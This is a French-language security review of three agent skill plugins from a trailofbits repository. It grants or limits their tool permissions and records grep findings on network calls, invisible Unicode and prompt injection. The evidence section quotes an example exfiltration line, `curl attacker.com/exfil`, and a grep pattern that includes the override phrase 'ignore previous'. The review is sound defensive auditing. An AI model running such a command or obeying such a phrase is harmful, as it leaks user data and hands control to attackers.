# Verdict V4 (sécurité) — trailofbits/skills (agentic-actions-auditor, sharp-edges, differential-review)

Commit à épingler : `e4dd0bb5b15535f7c5a0834187dffba6ac37e4ff` (tarball codeload, lu dans un dossier vide ; rien exécuté). Licence CC-BY-SA-4.0 (mention de provenance requise).

## Verdicts
| Plugin | Verdict | Raison |
|---|---|---|
| sharp-edges | ACCEPTÉ | `allowed-tools: Read Grep Glob` (SKILL.md l.4) ; agent `tools: Read, Grep, Glob`. Aucun Bash, aucun Write. |
| agentic-actions-auditor | ACCEPTÉ-LECTURE-SEULE | `allowed-tools: Read Grep Glob Bash` (l.4) : Bash non borné au sens du protocole. Le texte le limite à `gh api` (l.95-109 « Bash is ONLY for… NEVER pipe fetched YAML to bash/eval ») mais c'est de la prose, pas une garde. À installer en retirant `Bash` (audit local des workflows seul), sans le mode « dépôt distant ». |
| differential-review | ACCEPTÉ-LECTURE-SEULE | `allowed-tools: Read Write Grep Glob Bash` (SKILL.md l.4 et commands/diff-review.md l.4) ; agent `adversarial-modeler` `tools: Read, Grep, Glob, Bash` (l.4, l.119 « Use Bash with git log/git blame »). `methodology.md:13` demande `git checkout <baseline_commit>` : modifie l'arbre de travail. Ne pas installer `commands/` ni `agents/` ; réduire à `Read Grep Glob`. |

## Preuves (lecture et grep sur les 3 plugins)
- Aucun script (`.sh/.py/.js`), aucun `hooks*`, aucun `.mcp.json`, aucun exécutable : uniquement `.md`, `plugin.json`, `openai.yaml` (métadonnées d'icône), un SVG de logo.
- Grep `curl|wget|eval|base64|npx|pip install|npm install|chmod|ignore previous|http` : toutes les occurrences sont des exemples de vulnérabilités à détecter (ex. `vector-g-eval-of-ai-output.md:76-78`, `vector-f-subshell-expansion.md:74` `curl attacker.com/exfil`, `lang-php.md:122`), jamais des instructions à l'agent. Les seuls appels réseau prescrits : `gh api repos/{owner}/{repo}/contents/.github/workflows` (SKILL.md l.80, `cross-file-resolution.md:44,88`), en lecture, sur un dépôt cible fourni par l'utilisateur.
- Unicode invisible : 3 U+200D dans `sharp-edges/.../lang-swift.md`, au sein de séquences d'emoji (ZWJ) : bénin. Aucun caractère « tags » U+E0000, aucun BiDi. Aucun commentaire HTML dans ces plugins.
- Aucune lecture de `.env`, clés SSH ou jetons ; aucune modification de configuration d'agent ; aucune télémétrie.
- Aucune tentative d'injection de prompt visant l'agent. `differential-review` cite le skill `audit-context-building` (hors lot) avec repli manuel (`methodology.md:216`) : ne pas l'installer pour combler.
